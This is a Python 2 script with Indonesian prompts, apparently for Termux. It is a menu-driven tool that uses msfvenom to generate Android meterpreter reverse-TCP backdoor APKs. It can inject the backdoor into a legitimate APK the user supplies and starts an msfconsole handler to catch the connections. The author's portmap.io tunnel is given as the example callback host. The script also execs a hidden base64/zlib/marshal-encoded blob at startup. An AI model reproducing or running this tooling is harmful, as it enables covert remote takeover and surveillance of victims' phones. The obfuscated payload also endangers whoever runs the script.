# -*- coding: utf-8 -*-
# open resources Sampai Update Versi Stable


import os;
import time;
import sys
import subprocess
from bs4 import BeautifulSoup as Soup

putih="\x1b[1;97m"
merah="\x1b[1;91m"
hijau="\x1b[1;92m" 
red= '\033[91m'
orange= '\33[38;5;208m'
green= '\033[92m'
cyan= '\033[36m'
bold= '\033[1m'
end= '\033[0m'




os.system("clear")
print putih
confirm =raw_input('Sudah mempunyai akun Portmap.io? y/n : ')
if confirm== 'y':
  os.system('clear')  
else :
  if confirm== 'n':
    print '' 
    print 'buat akun portmap.io dulu'
    print '' 
    os.system('termux-open https://portmap.io')
    time.sleep(1)
    exit()
  else :
    if confirm== ' ':
      os.system('python2 msfgaf.py')
    else :
      print ('konfirmasi Ditolak!')
      time.sleep(1)
      os.system('python2 msfgaf.py')
      

import marshal,zlib,base64
exec(marshal.loads(zlib.decompress(base64.b64decode("eJzNU1tLAkEUHm+lRkFPQr0c6MUXEwuKLkRrhJZk4uXBehrddVzci+zMFhK99QMKkiDoz/lLOjOuohZBT3Vm5uw5Z77vm2F3T5sEFsJ1iouvotMJeSLkBoMQqaXDWGlPcDI5k7hrorYLRT2MTmASISkRIik9SlLjQiwoLE0Ky0EhrgphglQM9IRUIXhSEjXLPI9nJGHzNnd0sGNDEO3bo+HraPj8z+bbzPVexmHOhkWrnFcvygWtrpVlplB7dsBbxKLOrOaMZInaJtRNnfYgb3iCOoz5DoNLek9boAnKoWYwalF1BEw0fhCUNzMsqUM96kCxUWpcQRNz0BydgkV7fg/r83LqhuhnNN//+it8nR9Jvos/U+b3xleQB5ovuq4HcAh8A/MC7VAPqibvDeChMqhq9Qy/Y4/4Gsbwgim6fkvBtzDvCtE/zGaZqm63XTs75WRt3mG0E/Cari/8liF5sHDMdyZkB6Yj6ERUNuWAOiKGAfMMYxz1fWF20wo2dVz2rM4UxXKZK1udr6mmj+FYVyMRKqflRjU6x50TiOPj2HZ13zJOFFZufgKdeW2g"))))     




def remote():
    os.system("clear")
    print putih
    confirm=raw_input('sudah Aktifkan OpenVPN?  y/N : ')
    if confirm== '' :
    	print 'Harus Diisi'
        remote()
    else :
    	if confirm== 'y' :
    	    print ' '           
    	else :
    	    if confirm== 'n' :
    	        os.system('clear')
            	print 'anda harus mengaktifkan OpenVPN untuk melanjutkan'
                time.sleep(2)
    	        os.system('am start --user 0 -n net.openvpn.openvpn/net.openvpn.unified.MainActivity')
                remote()
                
            else :
            	print 'Konfirmasi Salah!'
                os.system('clear')
                remote()
    	
    logo()
    print (''+putih)
    os.system('ifconfig')
    print ('')
    print (merah+'___________________«»')
    
    print putih+"IP Local Mu"
    print "\x1b[1;91m----------------------------------------------"
    print " pastekan IP Tun0 inet disini"
    lh =raw_input(" LHOST : ")
    os.system("clear")
    if lh== '':
      logo()
      print merah+"[!] Harus DiIsi"
      time.sleep(1)
      os.system("clear")
      remote()
    else :
      os.system("clear")
    
    os.system("clear")
    logo()
    print "\x1b[1;97mMasukan LPORT"
    print "contoh"
    print "tcp://gafar97port-53967.portmap.io:53967=>\x1b[1;91m8080"
    print "\x1b[1;91m                                            ^"
    print "----------------------------------------------"
    lp =raw_input("LPORT : ")
    os.system("clear")
    
    if lp== '':
      print "[!]Harus DiIsi"
      time.sleep(1)
      os.system("clear")
      remote()
    else :
      os.system("clear")
      os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+str(lh)+";set LPORT "+str(lp)+";exploit;'");
      home() 


    
def sisip():
    os.system("clear")
    logo()
    name=raw_input('Nama Infeksi : ')
    if name == '' :
    	sisip() 
    print "\x1b[1;97mAmbil \x1b[1;91m5 Digit angka \x1b[1;97mSetelah TAnda (:)"
    print "Contoh Menggunakan Config Saya"
    print "tcp://gafar97port-53967.portmap.io:\x1b[1;91m53967" 
    print "                                     \x1b[1;91m^"
    print "----------------------------------------------"
    port=raw_input("Port : ")
    if port== ' ' :
    	print 'Harus Diisi'
        sisip()
    else :
    	print ' '
    print "\x1b[1;97mMasukan LHOST"
    print "Contoh Menggunakan Config Saya"
    print "\x1b[1;91mgafar97port-53967.portmap.io" 
    print "\x1b[1;91m                 ^"
    print "----------------------------------------------"
    lh=raw_input("lhost : ")
    if lh== ' ' :
    	print 'Harus Diisi'
    else :
    	print ' '
    os.system('clear')
    logo()
    print (merah+'«__________________✧_List File_✧__________________»')
    print (''+putih)
    os.system('ls')
    print ('')
    print (merah+'___________________«»')
    
    
    bhn=raw_input(merah+"╚═\x1b[1;91m▶"+merah+"Input Bahan :"+putih+' ');
    os.system('clear')
    
    print hijau+"[*] GENERATE BACKDOOR \n";
    os.system('apktool if '+str(bhn))    
    os.system('msfvenom -x '+str(bhn)+' -p android/meterpreter/reverse_tcp lhost='+str(lh)+' lport='+str(port)+' -o '+str(name)+'.apk');
    os.system('mv '+str(name)+'.apk /storage/emulated/0/')
    os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity') 
    time.sleep(3)
    home()

	
    
    
    

    
    
    
def update():
	os.system('clear')
	os.system('git pull origin master')
	raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
	home()
    
	


    
   
   
    
def baru():
    os.system('clear')
    logo()
    name=raw_input("Name : ")
    
    print "\x1b[1;97mAmbil \x1b[1;91m5 Digit angka \x1b[1;97mSetelah TAnda (:)"
    print "Contoh Menggunakan Config Saya"
    print "tcp://gafar97port-53967.portmap.io:\x1b[1;91m53967" 
    print "                                     \x1b[1;91m^"
    print "----------------------------------------------"
    port=raw_input("Port : ")
    
    print "\x1b[1;97mMasukan LHOST"
    print "Contoh Menggunakan Config Saya"
    print "\x1b[1;91mgafar97port-53967.portmap.io" 
    print "\x1b[1;91m                 ^"
    print "----------------------------------------------"
    lh=raw_input("lhost : ")
    
    os.system('clear')
    print hijau+"[*] GENERATE BACKDOOR \n"
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+lh+" LPORT="+port+" -o "+name+".apk")
    time.sleep(4)
    os.system('mv '+str(name)+'.apk /storage/emulated/0/')
    time.sleep(4)
    os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
    home()
  
    
def menu():
    os.system('clear')
    time.sleep(1)
    logo()
    print '\x1b[1;91m1.\x1b[1;97mSisipkan Bacdoor \x1b[1;91m{'+orange+'beta'+merah+'}'
    print '\x1b[1;91m2.\x1b[1;97mBuat Backdoor Baru        '
    print '\x1b[1;91m3.\x1b[1;97mEsekusi'
    print '\x1b[1;91m4.\x1b[1;97mUpdate--'
    print '\x1b[1;91m5.\x1b[1;97mExit'
    print '\r\x1b[1;91m__________________________________________«» '
 
menu();

def pilih():
    zedd = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
    if zedd == '':
        print '\x1b[1;91m[!] Can\'t empty'
        time.sleep(1)
        os.system('clear')
        menu()
        pilih()
    else:
        if zedd == '1':
            sisip()
        else:
            if zedd == '2':
                baru()
            else:
              if zedd == '3':
                remote()
              else:
				  if zedd == '4':
					  update()
				  else:	
					 if zedd == '5':
						  exit()
					 else:					
					  print '\x1b[1;91m[!] Pilih 1,2,3'
					  os.system('clear')
					  home()
					  
                
        
def home():
	menu()
	pilih()         
            
        
            
        
        

pilih();
    
